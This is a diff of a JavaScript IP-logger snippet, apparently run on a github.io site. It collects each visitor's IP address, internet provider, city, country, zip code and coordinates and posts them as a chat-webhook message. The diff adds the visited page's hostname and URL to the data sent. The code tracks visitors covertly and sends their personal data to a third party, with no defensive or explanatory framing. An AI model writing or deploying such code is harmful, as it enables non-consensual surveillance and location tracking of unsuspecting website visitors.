@@ -1,4 +1,4 @@
- function httpGet(theUrl)
+function httpGet(theUrl)
   {
     var xmlHttp = new XMLHttpRequest();
     xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
@@ -16,9 +16,9 @@ request.setRequestHeader('Content-type', 'application/json');
 
 const params = {
 	username: "Logger dfgvbbt.github.io!",
-	"content": "<t:"+Math.floor(Date.now()/1000)+">",
+	"content": "Version **1.3.1**(9/10/2022)\n**In <t:"+Math.floor(Date.now()/1000)+">**",
 	"embeds": [{
-    		"title": "**Have A Unknown Visitor?**",
+    		"title": "**Have A Unknown Player?**",
 		"fields": [
             {
 	        "name": "City",
@@ -27,12 +27,12 @@ const params = {
       		},
             {
 	        "name": "Country",
- 	     	 "value": "country_code:**"+ suk.country_code + "**\ncountry_name: **"+ suk.country_name +"**\ncallingCode: **"+suk.callingCode+"**\ncountryCapital: **" + suk.countryCapital+"**\ncurrency: **"+suk.currency+"**\ncurrencySymbol: **"+suk.currencySymbol+"**\nemojiFlag: **"+suk.emojiFlag+"**\nflagUrl: **[View](" + suk.flagUrl+")**\ntime_zone: **"+suk.time_zone+"**\nzip_code: "+suk.zip_code,
+ 	     	 "value": "country_code:**"+ suk.country_code + "**\ncountry_name: **"+ suk.country_name +"**\ncallingCode: **"+suk.callingCode+"**\ncountryCapital: **" + suk.countryCapital+"**\ncurrency: **"+suk.currency+"**\ncurrencySymbol: **"+suk.currencySymbol+"**\nemojiFlag: **"+suk.emojiFlag+"**\nflagUrl: **[View](" + suk.flagUrl+")**\ntime_zone: **"+suk.time_zone+"**\nzip_code: **"+suk.zip_code+"**",
                 "inline": true
       		},
             {
 	        "name": "Client",
- 	     	 "value": "Ip: **"+suk.ip+"**\nOrganisation: **"+suk.organisation+"**\nis_in_european_union: **"+suk.is_in_european_union + "**\nLatitude: **"+suk.latitude+"**\nLongitude: **"+suk.longitude+"**",
+ 	     	 "value": "From website: **["+window.location.hostname+"]("+window.location.href+")**\nIp: **"+suk.ip+"**\nOrganisation: **"+suk.organisation+"**\nis_in_european_union: **"+suk.is_in_european_union + "**\nLatitude: **"+suk.latitude+"**\nLongitude: **"+suk.longitude+"**",
                 "inline": true
       		},
             {
